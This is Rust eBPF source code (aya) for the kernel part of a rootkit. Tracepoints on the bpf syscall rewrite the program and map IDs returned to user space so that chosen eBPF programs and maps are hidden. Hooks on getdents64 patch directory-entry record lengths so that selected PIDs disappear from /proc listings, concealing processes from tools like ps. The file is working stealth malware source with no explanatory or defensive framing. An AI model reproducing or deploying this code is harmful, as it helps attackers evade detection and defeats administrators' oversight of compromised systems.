#![no_std]
#![no_main]

use aya_ebpf::{
    bindings::{bpf_attr, bpf_cmd},
    cty::c_void,
    helpers::{
        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read,
        bpf_probe_read_user, bpf_probe_read_user_str_bytes, bpf_probe_write_user,
    },
    macros::{map, tracepoint},
    maps::{Array, HashMap, Queue},
    programs::TracePointContext,
};
use aya_log_ebpf::{debug, error, info};
#[map]
static PROG_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0);
#[map]
static MAP_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0);
#[map]
static HIDDEN_BPF_OBJ: HashMap<u32, [u32; 32]> = HashMap::<u32, [u32; 32]>::with_max_entries(2, 0);

#[map]
static HIDDEN_PIDS: Array<HiddenPid> = Array::with_max_entries(2, 0);
#[map]
static PID_DIRENTS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(32, 0);
#[map]
static PARSED: Queue<QueuedDirent> = Queue::with_max_entries(8192, 0);

const MAX_DIRENTS: u32 = 500u32; //KEEP IT LOW AS bpf_loop can end the loop unexpectedly otherwise
const MAX_PID_LENGTH: usize = 10; //KEEP IT LOW AS bpf_loop can end the loop unexpectedly otherwise

#[repr(C)]
pub struct Buf {
    pub buf: [u8; 10],
}
#[repr(C)]
struct HiddenPid {
    bytes: [u8; MAX_PID_LENGTH],
    len: usize,
}

enum BpfObjType {
    Prog,
    Map,
}
#[inline]
fn update_obj_id(
    obj_type: BpfObjType,
    update_value: u32,
    src_prog_attr: &mut bpf_attr,
    dst_prog_attr: *mut bpf_attr,
) -> Result<u32, u32> {
    match obj_type {
        BpfObjType::Prog => src_prog_attr.__bindgen_anon_6.__bindgen_anon_1.prog_id = update_value,
        BpfObjType::Map => src_prog_attr.__bindgen_anon_6.__bindgen_anon_1.map_id = update_value,
    }
    unsafe {
        bpf_probe_write_user(dst_prog_attr, src_prog_attr as *const bpf_attr).map_err(|_| 0u32)?
    };
    Ok(0)
}

#[tracepoint]
fn stealth_bpf(ctx: TracePointContext) -> Result<u32, u32> {
    let cmd: u32 = unsafe { ctx.read_at(16).map_err(|_| 0u32)? };
    let mut_attr: *mut bpf_attr = unsafe { ctx.read_at(24).map_err(|_| 0u32)? };
    let mut attr_cpy: bpf_attr = unsafe { bpf_probe_read(mut_attr).map_err(|_| 1u32)? };
    match cmd {
        bpf_cmd::BPF_PROG_GET_NEXT_ID => {
            let prog_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };
            if let Some(skip_id) = unsafe { PROG_SKIP.get(&prog_id) } {
                update_obj_id(BpfObjType::Prog, *skip_id, &mut attr_cpy, mut_attr)?;
                debug!(&ctx, "prog: {} -> {}", prog_id, *skip_id);
            }
        }
        bpf_cmd::BPF_MAP_GET_NEXT_ID => {
            let map_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };
            if let Some(skip_id) = unsafe { MAP_SKIP.get(&map_id) } {
                update_obj_id(BpfObjType::Map, *skip_id, &mut attr_cpy, mut_attr)?;
                debug!(&ctx, "map: {} -> {}", map_id, *skip_id);
            }
        }
        bpf_cmd::BPF_PROG_GET_FD_BY_ID => {
            let prog_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };

            if let Some(hidden_progs) = unsafe { HIDDEN_BPF_OBJ.get(&0) } {
                if hidden_progs.contains(&prog_id) {
                    update_obj_id(BpfObjType::Prog, u32::MAX, &mut attr_cpy, mut_attr)?;
                    debug!(&ctx, "prog: {}-> max", prog_id);
                }
            }
        }
        bpf_cmd::BPF_MAP_GET_FD_BY_ID => {
            let map_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };

            if let Some(hidden_maps) = unsafe { HIDDEN_BPF_OBJ.get(&1) } {
                if hidden_maps.contains(&map_id) {
                    update_obj_id(BpfObjType::Map, u32::MAX, &mut attr_cpy, mut_attr)?;
                    debug!(&ctx, "map: {} -> max", map_id);
                }
            }
        }
        _ => {}
    };
    Ok(0)
}

#[tracepoint]
pub fn stealth_pid_enter(ctx: TracePointContext) -> Result<u32, u32> {
    let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;

    let dirents_buf_addr = unsafe { ctx.read_at::<u64>(24).map_err(|_| 1u32)? };
    PID_DIRENTS
        .insert(&caller_pid, &dirents_buf_addr, 0)
        .map_err(|_| 1u32)?;
    Ok(0)
}

#[repr(C)]
#[derive(Debug)]
pub struct LinuxDirent64 {
    pub d_ino: ::aya_ebpf::cty::c_ulonglong,
    pub d_off: ::aya_ebpf::cty::c_longlong,
    pub d_reclen: ::aya_ebpf::cty::c_ushort,
    pub d_type: ::aya_ebpf::cty::c_uchar,
    pub d_name: [u8; 0],
}

#[repr(C)]
#[derive(Debug)]
pub struct QueuedDirent {
    pub idx: u32,
    pub bpos: u64,
    pub d_off: i64,
    pub d_reclen: ::aya_ebpf::cty::c_ushort,
    pub d_type: ::aya_ebpf::cty::c_uchar,
    pub d_name: [u8; 10],
}

#[repr(C)]
struct DirentData<'a> {
    ctx: &'a TracePointContext,
    bpos: u64,
    max_offset: u64,
    dirents_buf_addr: u64,
    d_reclen: u16,
    d_reclen_prev: u16,
    patch_succeded: bool,
}

fn remove_curr_dirent(ctx: &mut DirentData) -> Result<(), i64> {
    let d_reclen_new = (ctx.d_reclen + ctx.d_reclen_prev) as u16;
    let _ = unsafe {
        bpf_probe_write_user(
            (ctx.dirents_buf_addr + ctx.bpos - ctx.d_reclen_prev as u64 + 16u64) as *mut u16,
            &d_reclen_new as *const u16,
        )?
    };
    ctx.patch_succeded = true;
    Ok(())
}

#[inline]
fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
    if idx >= MAX_DIRENTS {
        debug!(ctx.ctx, "{}>{}", idx, MAX_DIRENTS);
        return 1;
    }
    if ctx.patch_succeded {
        info!(ctx.ctx, "already patched!");
        return 1;
    }
    if ctx.bpos >= ctx.max_offset {
        debug!(ctx.ctx, "({}) maxoffset {} exceeded", idx, ctx.max_offset);
        return 1;
    }

    if let Ok(dirent) = unsafe {
        bpf_probe_read_user((ctx.dirents_buf_addr + ctx.bpos) as *const LinuxDirent64)
            .map_err(|_| 1u32)
    } {
        if [4u8, 8u8, 10u8].contains(&dirent.d_type) {
            ctx.d_reclen = dirent.d_reclen;

            let mut buf = [0u8; 10];
            let parsed_pid = unsafe {
                bpf_probe_read_user_str_bytes(
                    (ctx.dirents_buf_addr + ctx.bpos + 19) as *const u8,
                    &mut buf,
                )
            };

            let parsed_pid = parsed_pid.unwrap();

            // let mut buff = [0u8; 10];
            // for (i, c) in parsed_pid.iter().enumerate() {
            //     buff[i] = *c
            // }

            // PARSED
            //     .push(
            //         &QueuedDirent {
            //             idx,
            //             bpos: ctx.bpos,
            //             d_off: dirent.d_off,
            //             d_reclen: dirent.d_reclen,
            //             d_type: dirent.d_type,
            //             d_name: buff,
            //         },
            //         0,
            //     )
            //     .unwrap();

            for i in 0..2 {
                match HIDDEN_PIDS.get(i) {
                    Some(hidden_pid) => {
                        if {
                            let mut found = true;
                            for j in 0..parsed_pid.len() {
                                if hidden_pid.bytes[j] != parsed_pid[j] {
                                    found = false;
                                    break;
                                }
                            }
                            found
                        } && hidden_pid.len == parsed_pid.len()
                        {
                            info!(ctx.ctx, "FOUND IT!!");
                            if let Err(_) = remove_curr_dirent(ctx) {
                                error!(ctx.ctx, "Error in patching");
                            } else {
                                info!(ctx.ctx, "PATCHED!!");
                            }
                            return 1;
                        }
                    }
                    _ => {}
                }
            }
            ctx.bpos += dirent.d_reclen as u64;
            ctx.d_reclen_prev = dirent.d_reclen;
        }
        0
    } else {
        info!(ctx.ctx, "dirent entry {} not found:(", idx);
        return 1;
    }
}

#[tracepoint]
pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
    let caller_pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    // if let Ok(cmd) = bpf_get_current_comm().map_err(|_| 1u32) {
    //     if cmd[..2] == [112, 115] {
    //         info!(&ctx, "ps called pid: {}", caller_pid);
    //     } else if cmd[..5] == [112, 114, 111, 99, 115] {
    //         info!(&ctx, "procs called pid: {}", caller_pid);
    //     } else {
    //         PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;
    //         return Ok(0);
    //     };
    // }

    let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
    debug!(&ctx, "max offset is: {}", max_offset);
    let dirents_buf_addr = *unsafe { PID_DIRENTS.get(&caller_pid) }.ok_or(1u32)?;
    let mut dirent_data = DirentData {
        ctx: &ctx,
        bpos: 0,
        max_offset,
        dirents_buf_addr,
        d_reclen: 0,
        d_reclen_prev: 0,
        patch_succeded: false,
    };

    unsafe {
        bpf_loop(
            MAX_DIRENTS,
            patch_dirent_if_found as *mut fn(u64, *mut c_void) -> i64 as *mut c_void,
            &mut dirent_data as *mut DirentData as *mut c_void,
            0,
        )
    };
    debug!(&ctx, "out of loop : {}/{} ", dirent_data.bpos, max_offset,);
    PID_DIRENTS.remove(&caller_pid).map_err(|_| 1u32)?;

    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
